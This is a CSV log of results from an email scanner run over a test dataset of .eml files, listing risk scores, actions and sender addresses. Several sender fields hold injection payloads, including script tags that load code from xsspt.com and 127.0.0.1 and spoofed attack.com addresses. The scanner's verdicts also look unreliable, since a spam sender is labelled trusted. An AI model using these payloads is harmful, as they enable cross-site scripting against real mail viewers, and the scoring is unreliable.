filename,status,ground_truth,risk_score,severity,recommended_action,anomaly_score,detection_score,attribution_country,attribution_confidence,campaign_id,healing_applied,from_addr,spf,dkim,dmarc,elapsed_ms,explanation,error,timestamp,file
74105f2be0c2c6c47fb89ad451f8b2b2.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,18.3,CAMP-76F4FF36,False,2.4146.d6-v6zi1tiilajh.1@cda01.cdnow.com,,,,183.0,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:56.325834,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\74105f2be0c2c6c47fb89ad451f8b2b2.eml
9d43f08ac65f520564ef9c6a5859fc76.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,17.4,CAMP-FB1BD7A9,False,"""heizenrader@enron.com""",,,,190.9,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:56.343679,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\9d43f08ac65f520564ef9c6a5859fc76.eml
22dd315d9e7cf74d1cba6fd3e437309a.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,20.8,,False,976e3ac7-7875-431c-841e-d85197deb2eb.itsimazing.com@itsimazing.etoll.net,,,,198.1,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:56.367839,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\22dd315d9e7cf74d1cba6fd3e437309a.eml
1949312e3c46ebbc43a95fd4860fb2c8.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,rjn@predict.com,,,,192.6,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:56.391164,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\1949312e3c46ebbc43a95fd4860fb2c8.eml
ea7b38a4f35739bdd7ba5380a89486d9.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,Erich Terry <dwpennyrozism@pennyrozis.com>,,,,320.9,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:56.297353,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\ea7b38a4f35739bdd7ba5380a89486d9.eml
c4d0ec8e8b8565a548d22ef3597f5b67.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,CAMP-6D72412E,False,cratmiami@aol.com,,,,223.7,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:56.427620,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\c4d0ec8e8b8565a548d22ef3597f5b67.eml
ea89f3cbae1fe9e066c6c88b408b1b36.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,14.3,,False,Neva Daley <isabel@ac.upc.es>,,,,234.2,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:56.446765,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\ea89f3cbae1fe9e066c6c88b408b1b36.eml
7415faf5ef35fa7219bb86a02f19ac5a.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,CAMP-1A3D3DD8,False,"""test<STYLE>@import'http://www.example.com/js.css';</STYLE>@attack.com""",,,,240.1,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:56.464525,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\7415faf5ef35fa7219bb86a02f19ac5a.eml
4bf2ea64dbc1771078b93908cf8ed6f1.eml,ERROR,,,,,,,,,,,,,,,310.4,,HTTP_500,2026-09-22T11:31:56.409626,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\4bf2ea64dbc1771078b93908cf8ed6f1.eml
22edba5d489b3a1f0d0bc7010be37099.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,20.1,,False,"""special-offers-admin@mail.southwest.com"" <>, test@attack.com",,,,233.0,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:56.508887,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\22edba5d489b3a1f0d0bc7010be37099.eml
194b65e446f657486c3a24b153436ef6.eml,ERROR,,,,,,,,,,,,,,,209.1,,HTTP_500,2026-09-22T11:31:56.534574,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\194b65e446f657486c3a24b153436ef6.eml
4bf50141791739ecefe767db35cee1a9.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,20.4,CAMP-C2A2B012,False,amh5h@cms.mail.virginia.edu￿attack.com,,,,195.3,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:56.565965,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\4bf50141791739ecefe767db35cee1a9.eml
c4d4b0c0acde41b6113d67f2325b9716.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,19.3,CAMP-45358757,False,"""b64 b64""@attack.com",,,,200.4,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:56.583772,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\c4d4b0c0acde41b6113d67f2325b9716.eml
9d4dfaa2190db7bdf00c2b9a1210f806.eml,OK,,43.0,MEDIUM,REVIEW,0.1,65,,18.4,CAMP-3A070138,False,admin@security.vanderbilt.edu,,,,323.1,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:56.483566,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\9d4dfaa2190db7bdf00c2b9a1210f806.eml
742cef11fae045941a6f4b4425d15c1a.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,CAMP-23519F9B,False,"""jzhang1982@gmail.com""",,,,183.5,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:56.651363,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\742cef11fae045941a6f4b4425d15c1a.eml
9d4f621a53f02e77c85497424c91c368.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,16.5,,False,"""\\u202nosnehpets_ttam@\\u202moc.ygrenenaidanacnap""",,,,177.3,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:56.680948,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\9d4f621a53f02e77c85497424c91c368.eml
22eef69afa0bdd3884ab6b65633dac7e.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,CAMP-4E29B064,False,"clickathome.relations-@enron.com, ncuccine@ramapo.edu",,,,170.9,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:56.704711,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\22eef69afa0bdd3884ab6b65633dac7e.eml
ea8ecd504ab3e8b56d93afb800610d66.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,CAMP-3B7EC35B,False,"""test</textarea><script src=http://xsspt.com/6zTrS1?1456361170></script>@attack.com""",,,,274.8,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:56.618357,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\ea8ecd504ab3e8b56d93afb800610d66.eml
4bfaae3e4ae88baa13cc79dcecc47082.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,CAMP-B4797F67,False,patrwalke@earthlink.net,,,,171.3,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:56.741964,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\4bfaae3e4ae88baa13cc79dcecc47082.eml
c4d70894e89ee30b47019451f95b98d4.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,17.6,,False,macarthy@iol.ie}attack.com,,,,192.7,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:56.743800,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\c4d70894e89ee30b47019451f95b98d4.eml
ea8edf5de915fa74e60b8a508fd7af4b.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,Annabel Cleveland <wzou@linamar.com>,,,,193.5,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:56.761251,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\ea8edf5de915fa74e60b8a508fd7af4b.eml
743aae310e6531a98eb6a4638a595b3c.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,20.4,CAMP-F8793476,False,ufhtxabws7@hotmail.com,,,,189.8,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:56.784233,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\743aae310e6531a98eb6a4638a595b3c.eml
194ec0695d2582baacf7b9e010a8d573.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,20.4,,False,"""lazytrader@go.com"" <>, test@attack.com",,,,278.7,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:56.720098,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\194ec0695d2582baacf7b9e010a8d573.eml
22ef097f92e4c895e2b260b64cf8134a.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,17.6,,False,"""dwalkup@pclient.ml.com"" <>, test@attack.com",,,,183.7,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:56.834878,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\22ef097f92e4c895e2b260b64cf8134a.eml
195214ca464d00d36e4f990aba884c14.eml,ERROR,,,,,,,,,,,,,,,163.7,,HTTP_500,2026-09-22T11:31:56.858300,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\195214ca464d00d36e4f990aba884c14.eml
4c0630be1d31419d2d3a33f0779ff612.eml,ERROR,,,,,,,,,,,,,,,149.2,,HTTP_500,2026-09-22T11:31:56.875642,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\4c0630be1d31419d2d3a33f0779ff612.eml
9d518bcb178369f7fa74ad11eb077a35.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,20.4,CAMP-9D1BB977,False,cbischof@earthlink.net,,,,240.7,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:56.806773,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\9d518bcb178369f7fa74ad11eb077a35.eml
ea93da66d89d84d22e2b10b6a35c8c73.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,17.4,CAMP-AA7EE00B,False,test@attack.com,,,,157.2,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:56.913310,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\ea93da66d89d84d22e2b10b6a35c8c73.eml
744f975f216b2bd694ea589d8567cdfb.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,18.0,CAMP-06657BF9,False,rgladstein@aol.com}attack.com,,,,155.3,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:56.936536,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\744f975f216b2bd694ea589d8567cdfb.eml
9d62645cf728599b99e90650c98b621c.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,18.1,,False,"""danandjen@charter.net""",,,,155.4,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:56.954777,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\9d62645cf728599b99e90650c98b621c.eml
22f8fd1d683a35604522a8f662a0d718.eml,OK,,40.0,MEDIUM,REVIEW,0.1,60,,15.1,,False,Avis Ladner <akeleyqb@h555.net>,,,,154.3,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:56.974034,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\22f8fd1d683a35604522a8f662a0d718.eml
c4d93603ca747b9c6f7b94634a871696.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,17.4,,False,"""Sean Kellogg"", lyymjdr@net.pe",,,,256.4,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:56.893233,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\c4d93603ca747b9c6f7b94634a871696.eml
4c0be3299c948245c8d1dab8073bd275.eml,ERROR,,,,,,,,,,,,,,,133.7,,HTTP_500,2026-09-22T11:31:57.018594,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\4c0be3299c948245c8d1dab8073bd275.eml
c4dc93c30c04ed6abfdac79146b999bb.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,17.4,,False,lcoleygray@sbcglobal.net,,,,153.0,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:57.022122,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\c4dc93c30c04ed6abfdac79146b999bb.eml
ea94562f8f12af488cae6cb170c02ec2.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,19.6,,False,"""e27062@ok.ru""",,,,168.7,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:57.025042,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\ea94562f8f12af488cae6cb170c02ec2.eml
1956938843d2ec3b6386376f344cbefa.eml,OK,,43.0,MEDIUM,REVIEW,0.1,65,,20.4,CAMP-94E192AD,False,weezie.roberson@test.enron.com,,,,218.6,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:56.998805,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\1956938843d2ec3b6386376f344cbefa.eml
9d6af711ac5fc8fe27cb239cd8f3d9b6.eml,ERROR,,,,,,,,,,,,,,,148.7,,HTTP_500,2026-09-22T11:31:57.070544,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\9d6af711ac5fc8fe27cb239cd8f3d9b6.eml
196d1dc01e2d390a2d3b757fafede53a.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,CAMP-370DC9E7,False,"""test<img src=x onerror=d=document;e=d.createElement('script');e.src='http://127.0.0.1/i.js';d.body.appendChild(e)>@attack.com""",,,,146.8,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:57.091861,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\196d1dc01e2d390a2d3b757fafede53a.eml
23017be2299cba77e97421ff92584a45.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,attameh12006@forexmail.ru,,,,148.5,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:57.110191,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\23017be2299cba77e97421ff92584a45.eml
4c0de13ffc8b1db4ad09e8e38ccd243d.eml,OK,,16.0,LOW,ALLOW,0.1,20,,20.4,,False,Cialis <qmarks@u2club.com>,,,,152.5,This email from Cialis <qmarks@u2club.com> matches your trusted behavioral profile and passed all security verification checks. It has been delivered safely to your inbox.,,2026-09-22T11:31:57.128341,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\4c0de13ffc8b1db4ad09e8e38ccd243d.eml
744faa84008e44319111199a3d3267e5.eml,ERROR,,,,,,,,,,,,,,,235.6,,HTTP_500,2026-09-22T11:31:57.047474,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\744faa84008e44319111199a3d3267e5.eml
ea9b2379e7f53eff1d849980e37d1821.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,20.7,CAMP-22508903,False,"""b64 b64""@attack.com",,,,152.5,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:57.152338,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\ea9b2379e7f53eff1d849980e37d1821.eml
74561e6e05b94298cecf423fdbc0c047.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,20.1,CAMP-9DF74EA6,False,"""mark.skilling@enron.com""",,,,151.5,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:57.175164,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\74561e6e05b94298cecf423fdbc0c047.eml
9d702ad7c731eb78c87aade165291f12.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,14.3,,False,Alphonso Childs <cfbm@cfb.ie>,,,,150.2,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:57.193790,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\9d702ad7c731eb78c87aade165291f12.eml
c4e24f927d807386b647eae34850d220.eml,OK,,43.0,MEDIUM,REVIEW,0.1,65,,19.5,CAMP-69BF3D34,False,Gorden T Jemwa <jemwa@sun.ac.za>,,,,216.8,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:57.149703,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\c4e24f927d807386b647eae34850d220.eml
